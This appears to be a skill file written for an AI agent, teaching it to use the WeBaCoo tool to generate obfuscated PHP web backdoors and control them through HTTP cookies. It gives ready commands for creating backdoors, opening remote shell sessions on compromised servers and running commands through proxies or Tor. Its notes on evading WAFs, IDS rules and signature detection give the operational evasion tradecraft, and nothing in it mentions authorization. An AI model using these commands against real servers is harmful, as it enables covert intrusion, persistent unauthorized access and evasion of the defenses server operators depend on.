---
name: webacoo
description: Generate and manage stealthy PHP web backdoors that use HTTP cookies for command and control (C2) communication. Use during post-exploitation or web application testing to maintain access to a compromised web server while bypassing basic security inspection by hiding payloads within cookie headers.
---

# webacoo

## Overview
WeBaCoo (Web Backdoor Cookie) is a post-exploitation tool that facilitates stealthy administration of compromised web servers. It generates PHP-based backdoors that receive commands via HTTP cookies, making the traffic appear as legitimate web requests. Category: Post-Exploitation / Web Application Testing.

## Installation (if not already installed)
Assume webacoo is already installed. If you encounter errors, install it via:

```bash
sudo apt install webacoo
```

Dependencies: libio-socket-socks-perl, liburi-perl, perl.

## Common Workflows

### Generate a stealthy backdoor
```bash
webacoo -g -o backdoor.php
```
Generates an obfuscated PHP backdoor using the default `system` function.

### Connect to a deployed backdoor
```bash
webacoo -t -u http://example.com/uploads/backdoor.php
```
Establishes an interactive pseudo-terminal session with the remote shell.

### Execute a single command via proxy
```bash
webacoo -t -u http://example.com/backdoor.php -p 127.0.0.1:8080 -e "id; uname -a"
```
Runs specific commands through a local proxy and exits.

### Generate backdoor with specific PHP function and custom cookie
```bash
webacoo -g -f 2 -o shell.php -c "session_id"
```
Uses `shell_exec` instead of `system` and sets the trigger cookie name to "session_id".

## Complete Command Reference

```
webacoo [options]
```

### Generation Options
| Flag | Description |
|------|-------------|
| `-g` | Generate backdoor code (requires `-o`) |
| `-f FUNCTION` | PHP System function to use (1: system [default], 2: shell_exec, 3: exec, 4: passthru, 5: popen) |
| `-o OUTPUT` | Generated backdoor output filename |
| `-r` | Return un-obfuscated backdoor code |

### Connection Options
| Flag | Description |
|------|-------------|
| `-t` | Establish remote "terminal" connection (requires `-u`) |
| `-u URL` | Target Backdoor URL |
| `-e CMD` | Single command execution mode (requires `-t` and `-u`) |
| `-m METHOD` | HTTP method to be used (default: GET) |
| `-c C_NAME` | Cookie name used for payload delivery (default: "M-cookie") |
| `-d DELIM` | Delimiter (default: New random for each request) |
| `-a AGENT` | HTTP header User-Agent (default provided) |
| `-p PROXY` | Use proxy (supports `tor`, `ip:port`, or `user:pass:ip:port`) |

### General Options
| Flag | Description |
|------|-------------|
| `-v LEVEL` | Verbose level (0: none [default], 1: print HTTP headers, 2: print HTTP headers + data) |
| `-l LOG` | Log activity to specified file |
| `-h` | Display help and exit |
| `update` | Check for updates and apply if any |

## Notes
- **Stealth**: Because the payload is encoded within the Cookie header, it often bypasses Web Application Firewalls (WAFs) or IDS rules that only inspect the POST body or GET parameters.
- **Obfuscation**: By default, the generated code is obfuscated to prevent signature-based detection on the server's filesystem. Use `-r` if you need the raw source.
- **Function Selection**: If the target server has `system()` disabled in `php.ini`, try alternative functions using the `-f` flag.